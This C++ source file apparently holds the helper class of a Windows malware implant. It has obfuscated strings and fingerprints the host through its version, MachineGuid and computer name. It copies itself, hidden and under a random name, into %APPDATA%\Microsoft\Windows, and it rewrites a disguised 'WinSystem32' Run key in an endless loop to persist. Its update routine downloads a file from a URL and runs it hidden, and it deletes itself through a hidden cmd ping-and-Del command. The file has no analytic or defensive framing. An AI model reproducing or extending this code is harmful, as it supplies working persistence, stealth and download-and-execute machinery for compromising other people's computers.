
#include <iostream>
#include <fstream>
#include <LM.h>
#include <wininet.h>
#include <windows.h>
#include <process.h>
#include <Tlhelp32.h>
#include <winbase.h>
#include <string.h>
#pragma comment(lib,"wininet")

#include <strsafe.h>

class Helpers
{
	public:



		static std::string GetWindowsVersionString() {
			std::string     winver;
			OSVERSIONINFOEX osver;
			SYSTEM_INFO     sysInfo;
			typedef void(__stdcall * GETSYSTEMINFO) (LPSYSTEM_INFO);

			__pragma(warning(push))
				__pragma(warning(disable:4996))
				memset(&osver, 0, sizeof(osver));
			osver.dwOSVersionInfoSize = sizeof(osver);
			GetVersionEx((LPOSVERSIONINFO)& osver);
			__pragma(warning(pop))
				DWORD major = 0;
			DWORD minor = 0;
			if (GetWinMajorMinorVersion(major, minor))
			{
				osver.dwMajorVersion = major;
				osver.dwMinorVersion = minor;
			}
			else if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2) {
				OSVERSIONINFOEXW osvi;
				ULONGLONG cm = 0;
				cm = VerSetConditionMask(cm, VER_MINORVERSION, VER_EQUAL);
				ZeroMemory(&osvi, sizeof(osvi));
				osvi.dwOSVersionInfoSize = sizeof(osvi);
				osvi.dwMinorVersion = 3;
				if (VerifyVersionInfoW(&osvi, VER_MINORVERSION, cm))
				{
					osver.dwMinorVersion = 3;
				}
			}

			GETSYSTEMINFO getSysInfo = (GETSYSTEMINFO)GetProcAddress(GetModuleHandle("kernel32.dll"), "GetNativeSystemInfo");
			if (getSysInfo == NULL)  getSysInfo = ::GetSystemInfo;
			getSysInfo(&sysInfo);

			if (osver.dwMajorVersion == 10 && osver.dwMinorVersion >= 0 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows 10 Server";
			if (osver.dwMajorVersion == 10 && osver.dwMinorVersion >= 0 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows 10";
			if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 3 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows Server 2012 R2";
			if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 3 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows 8.1";
			if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows Server 2012";
			if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows 8";
			if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 1 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows Server 2008 R2";
			if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 1 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows 7";
			if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 0 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows Server 2008";
			if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 0 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows Vista";
			if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 2 && osver.wProductType == VER_NT_WORKSTATION
				&& sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)  winver = "Windows XP x64";
			if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 2)   winver = "Windows Server 2003";
			if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 1)   winver = "Windows XP";
			if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 0)   winver = "Windows 2000";
			if (osver.dwMajorVersion < 5)   winver = "unknown";

			if (osver.wServicePackMajor != 0) {
				std::string sp;
				char buf[128] = { 0 };
				sp = " Service Pack ";
				sprintf_s(buf, sizeof(buf), "%hd", osver.wServicePackMajor);
				sp.append(buf);
				winver += sp;
			}

			return winver;
		}

		static void killProcessByName(const char* filename)
		{
			HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
			PROCESSENTRY32 pEntry;
			pEntry.dwSize = sizeof(pEntry);
			BOOL hRes = Process32First(hSnapShot, &pEntry);
			while (hRes)
			{
				if (strcmp(pEntry.szExeFile, filename) == 0)
				{
					HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
						(DWORD)pEntry.th32ProcessID);
					if (hProcess != NULL)
					{
						TerminateProcess(hProcess, 9);
						CloseHandle(hProcess);
					}
				}
				hRes = Process32Next(hSnapShot, &pEntry);
			}
			CloseHandle(hSnapShot);
		}

		static void DelMe()
		{

			//killProcessByName("cmd.exe");
			//killProcessByName("wscript.exe");
			TCHAR szModuleName[MAX_PATH];
			TCHAR szCmd[2 * MAX_PATH];
			STARTUPINFO si = { 0 };
			PROCESS_INFORMATION pi = { 0 };

			GetModuleFileName(NULL, szModuleName, MAX_PATH);
			std::string remove = OBFUSCATE("cmd.exe /C ping 127.0.0.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"");
			StringCbPrintf(szCmd, 2 * MAX_PATH, remove.c_str(), szModuleName);

			CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
		}

		static bool GetWinMajorMinorVersion(DWORD& major, DWORD& minor) {
			bool bRetCode = false;
			LPBYTE pinfoRawData = 0;
			if (NERR_Success == NetWkstaGetInfo(NULL, 100, &pinfoRawData))
			{
				WKSTA_INFO_100* pworkstationInfo = (WKSTA_INFO_100*)pinfoRawData;
				major = pworkstationInfo->wki100_ver_major;
				minor = pworkstationInfo->wki100_ver_minor;
				::NetApiBufferFree(pinfoRawData);
				bRetCode = true;
			}
			return bRetCode;
		}

		static std::string bstr_to_str(BSTR source) {
			_bstr_t wrapped_bstr = _bstr_t(source);
			int length = wrapped_bstr.length();
			char* char_array = new char[length];
			strcpy_s(char_array, length + 1, wrapped_bstr);
			return char_array;
		}


		static std::string getCurrentAv() {
			return "";
		}


		static std::string RandomString(int len) {
			srand((unsigned int)time(NULL));
			std::string str = OBFUSCATE("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
			std::string newstr;
			int pos;
			while (newstr.size() != len) {
				pos = ((rand() % (str.size() - 1)));
				newstr += str.substr(pos, 1);
			}
			return newstr;
		}

		static std::string ExePath() {
			char result[MAX_PATH];
			return std::string(result, GetModuleFileName(NULL, result, MAX_PATH));
		}

		static std::string ExeDir() {
			char buffer[MAX_PATH];
			GetModuleFileName(NULL, buffer, MAX_PATH);
			std::string::size_type pos = std::string(buffer).find_last_of("\\/");
			return std::string(buffer).substr(0, pos);
		}

		static std::string ExeName() {
			char buffer[MAX_PATH];
			GetModuleFileName(NULL, buffer, MAX_PATH);
			std::string::size_type pos = std::string(buffer).find_last_of("\\/");
			std::string t = std::string(buffer).substr(pos, pos);
			t.replace(0, 1, ""); //Remove '\'
			t.replace(t.length()-4, t.length(), ""); //Remove .exe
			return t;
		}

		static std::string checkIfRegKeyExists(std::string key) {
			LONG lResult;
			HKEY hKey;
			lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT(key.c_str()), 0, KEY_READ, &hKey);
			if (lResult != ERROR_SUCCESS) {
				if (lResult == ERROR_FILE_NOT_FOUND) {
					return "false";
				}
			}
			return "true";
		}

		static std::string installedOrnot() {
			//Kill Current Place
			std::string installPath = (std::string)getenv("APPDATA") + OBFUSCATE("\\Microsoft\\Windows\\");
			std::string installFile = (std::string)getenv("APPDATA") + OBFUSCATE("\\Microsoft\\Windows\\") + RandomString(10) + OBFUSCATE(".exe");
			//Check if Appdata Dir 

			if (CreateDirectory(installPath.c_str(), NULL) ||
				ERROR_ALREADY_EXISTS == GetLastError())
			{
				size_t found = ExePath().find("Microsoft");
				if (found != std::string::npos) {
					int attr = GetFileAttributes(ExePath().c_str());
					if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
						SetFileAttributes(ExePath().c_str(), attr | FILE_ATTRIBUTE_HIDDEN);
					}
					return "installed";
				}
				else {
					//Uninstalled Copy To AppData & Execute
					BOOL b = CopyFile(ExePath().c_str(), installFile.c_str(), 0);
					if (!b) {
						std::cout << "Error: " << GetLastError() << std::endl;
						std::cout << "Error: " << ExePath() << std::endl;
					}
					else {
						std::cout << "Installed " << std::endl;
						std::string rebootString = OBFUSCATE("  /C  start ") + installFile;
						//system(rebootString.c_str());
						ShellExecute(
							NULL,
							_T("open"),
							_T("cmd"),
							(LPCSTR)rebootString.c_str(), // params                            
							_T(" C:\ "),
							SW_HIDE);
						return "restart";
					}
					return "failed";
				}

	
			}
			else
			{
				return "failed";
			}
		}



		static std::string GetMachineGUID()
		{
			std::string ret;
			char value[64];
			DWORD size = _countof(value);
			DWORD type = REG_SZ;
			HKEY key;
			LONG retKey = ::RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &key);
			LONG retVal = ::RegQueryValueExA(key, "MachineGuid", nullptr, &type, (LPBYTE)value, &size);
			if (retKey == ERROR_SUCCESS && retVal == ERROR_SUCCESS) {
				ret = value;
			}
			::RegCloseKey(key);
			return ret;
		}


		static std::string getComputerName() {
			TCHAR chrComputerName[MAX_COMPUTERNAME_LENGTH + 1];
			std::string strRetVal;
			DWORD dwBufferSize = MAX_COMPUTERNAME_LENGTH + 1;
			if (GetComputerName(chrComputerName, &dwBufferSize)) {
				strRetVal = chrComputerName;
			}
			else {
				strRetVal = "";
			}
			return(strRetVal);
		}

		static std::vector<std::string> explode(const std::string& delimiter, const std::string& str) {
			std::vector<std::string> arr;
			int strleng = str.length();
			int delleng = delimiter.length();
			if (delleng == 0)
				return arr;//no change
			int i = 0;
			int k = 0;
			while (i < strleng)
			{
				int j = 0;
				while (i + j < strleng && j < delleng && str[i + j] == delimiter[j])
					j++;
				if (j == delleng)//found delimiter
				{
					arr.push_back(str.substr(k, i - k));
					i += delleng;
					k = i;
				}
				else {
					i++;
				}
			}
			arr.push_back(str.substr(k, i - k));
			return arr;
		}

		static std::string downloadFile(std::string url, std::string file) {
			std::cout << url;
			HINTERNET hInternetSession;
			HINTERNET hURL;
			DWORD dwBytesRead = 1;
			//Make internet connection.
			hInternetSession = InternetOpen(
				"Windows", // agent
				INTERNET_OPEN_TYPE_PRECONFIG,  // access
				NULL, NULL, 0);                // defaults

			// Make connection to desired page.
			hURL = InternetOpenUrl(
				hInternetSession,                       // session handle
				url.c_str(),   // URL to access
				NULL, 0, 0, 0);                         // defaults

			// Read file into memory buffer.
			char buf[1024];
			DWORD dwTemp;
			HANDLE hFile = CreateFile(file.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (INVALID_HANDLE_VALUE == hFile) {
				return false;
			}
			for (; dwBytesRead > 0;)
			{
				InternetReadFile(hURL, buf, (DWORD)sizeof(buf), &dwBytesRead);
				WriteFile(hFile, buf, dwBytesRead, &dwTemp, NULL);
			}

			// Close down connections.
			InternetCloseHandle(hURL);
			InternetCloseHandle(hInternetSession);
			CloseHandle(hFile);
			return "true";
		}


		static void addstartup()
		{
			while (true) {
					TCHAR path[100];
					GetModuleFileName(NULL, path, 100);
					HKEY newValue;
					RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
					RegSetValueEx(newValue, "WinSystem32", 0, REG_SZ, (LPBYTE)path, sizeof(path));
					RegCloseKey(newValue);
			
				Sleep(5000);
			}
		}

		static void removeRegInstallKey() {
			TCHAR path[100];
			GetModuleFileName(NULL, path, 100);
			HKEY newValue;
			RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
			RegDeleteValue(newValue, "WinSystem32");
			RegCloseKey(newValue);
		}

		static void uninstall() {
			removeRegInstallKey();
			DelMe();
		}

		static void update(std::string url) {
			std::string file((std::string)getenv("APPDATA") + OBFUSCATE("\\Microsoft\\Windows\\") + RandomString(10) + OBFUSCATE(".exe"));
			downloadFile(url, file);
			ShellExecute(GetDesktopWindow(), "open", file.c_str(), NULL, NULL, SW_HIDE);
			uninstall();
		}

		static std::string startNewProcess(std::string file) {
			STARTUPINFO si = {};
			si.cb = sizeof si;

			PROCESS_INFORMATION pi = {};
			const TCHAR* target = TEXT(file.c_str());

			if (!CreateProcess(target, 0, 0, FALSE, 0, 0, 0, 0, &si, &pi))
			{
				return "failed";
			}
			else {
				return "success";
			}

			std::cin.sync();
			std::cin.ignore();
		}

		static std::string startNewProcessGetID(std::string file) {
			STARTUPINFO si = {};
			si.cb = sizeof si;

			PROCESS_INFORMATION pi = {};
			const TCHAR* target = TEXT(file.c_str());

			if (!CreateProcess(target, 0, 0, FALSE, 0, 0, 0, 0, &si, &pi))
			{
				return "failed";
			}
			else {
				CloseHandle(pi.hThread);
				return std::to_string(GetProcessId(pi.hProcess));
			}

			std::cin.sync();
			std::cin.ignore();
		}
		
};




